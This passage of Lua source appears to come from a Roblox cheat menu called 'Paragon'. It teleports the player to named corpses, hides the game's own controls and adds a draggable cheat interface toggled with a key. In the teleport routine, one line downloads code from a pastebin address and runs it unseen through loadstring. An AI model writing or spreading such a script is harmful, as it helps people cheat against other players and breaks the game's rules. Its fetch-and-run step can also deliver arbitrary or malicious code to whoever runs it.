		        })
				local Corpses = game.Workspace.Corpses
				local LocalPlayer = game.Players.LocalPlayer
				local function RemoveSpaces(String)
					return String:gsub("%s+", "") or String
				end
				
				local function FindPlayer(String)
					String = RemoveSpaces(String)
					for _, _Player in pairs(Corpses:GetChildren()) do
						if _Player.Name:lower():match('^'.. String:lower()) then
							return _Player
						end
					end
					return nil
				end
				
				local Target = FindPlayer(script.Parent.Text)
					if Target and Target.HumanoidRootPart then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Target.CFrame
					loadstring(game:HttpGet('https://pastebin.com/raw/FaBGugbE'))() 
					wait(0.2)
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
					wait(4)
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
			end			
	end)

end
coroutine.resume(coroutine.create(SCRIPT_GRNP75_FAKESCRIPT))
function SCRIPT_JLJO88_FAKESCRIPT() -- Paragon.Interface 
	local script = Instance.new('LocalScript')
	script.Parent = Paragon
	game:GetService'RunService'.RenderStepped:connect(function()
	game.Players.LocalPlayer.PlayerGui["Interface Main"].Controls.Visible = false
	end)
	game.Players.LocalPlayer.PlayerGui["Interface Main"].Weapon.Controls.Visible = false
	
	local UI = game.Players.LocalPlayer.PlayerGui["Paragon"].ImageLabel
	UI.Login.Text = game.Players.LocalPlayer.Name
	UI:TweenPosition(UDim2.new(0.07, 0,0.032, 0),'Out','Quad',1)
	
				local s = Instance.new("Sound")
				s.Name = "Sound"
				s.SoundId = "http://www.roblox.com/asset/?id=2668759868"
				s.Volume = 7
				s.Looped = false
				s.archivable = false
				s.Parent = game.Lighting
	
	open = false
		function openclose()
			if open == false then
				UI:TweenPosition(UDim2.new(0.07, 0,-1, 0), 'Out', 'Quad', 1)
				open = true
			else
				UI:TweenPosition(UDim2.new(0.07, 0,0.032, 0), 'Out', 'Quad', 1)
				open = false
			end
		end
		
		plr = game.Players.LocalPlayer
		mouse = plr:GetMouse()
		mouse.KeyDown:connect(function(key)
		if key == "x" then
			openclose()
		end
		end)
	
	
	local UserInputService = game:GetService("UserInputService")
	
	local gui = game.Players.LocalPlayer.PlayerGui["Paragon"].ImageLabel
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
	    local delta = input.Position - dragStart
	    gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
	    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	        dragging = true
	        dragStart = input.Position
	        startPos = gui.Position
	        
	        input.Changed:Connect(function()
	            if input.UserInputState == Enum.UserInputState.End then
	                dragging = false
	            end
	        end)
	    end
	end)
	
	gui.InputChanged:Connect(function(input)
	    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	        dragInput = input
	    end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
	    if input == dragInput and dragging then
	        update(input)
	    end
	end)

end
coroutine.resume(coroutine.create(SCRIPT_JLJO88_FAKESCRIPT))
